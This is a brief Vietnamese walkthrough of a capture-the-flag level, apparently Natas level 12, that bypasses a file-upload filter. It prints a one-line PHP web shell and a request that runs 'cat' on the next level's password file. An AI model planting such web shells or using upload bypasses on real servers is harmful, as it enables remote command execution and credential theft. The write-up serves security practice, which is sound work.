Lv12
Truy cập vào bài, ta thấy dòng tiêu đề kèm với 2 nút ấn "choose file" và "upload file":
<img width="1920" height="467" alt="image" src="https://github.com/user-attachments/assets/632d3b1e-de7b-4465-a567-d3c18de2e406" />
Click chuột vào view src code, ta thấy được nguồn của trang web:
<img width="1398" height="981" alt="image" src="https://github.com/user-attachments/assets/befd7529-c2a0-4edd-96ec-9c69751cd0ac" />
<img width="962" height="363" alt="image" src="https://github.com/user-attachments/assets/07ca0e97-cf70-4055-ac28-aa084268b365" />
có vẻ như trang web này cho phép upload 1 file có kích thước không quá 1KB, vì vậy ta thử up 1 file .php vào
<img width="1920" height="528" alt="image" src="https://github.com/user-attachments/assets/304bb1d1-2f23-4634-8ba3-2e1d9541385f" />
Quan sát Burp suite để xem lại thao tác upload file .php vừa xong:
<img width="1485" height="534" alt="image" src="https://github.com/user-attachments/assets/8ca4da5a-4063-4450-b0a1-2e30ea1243cf" />
file đã được upload và sửa lại tên thành ********.jpg
Giờ ta đổi lại nội dung file thành "<?php echo system($_GET['cmd']); ?>" và upload lên web rồi di chuyển tới upload/nguyen.php?cmd=cat /etc/natas_webpass/natas13 để lấy pass
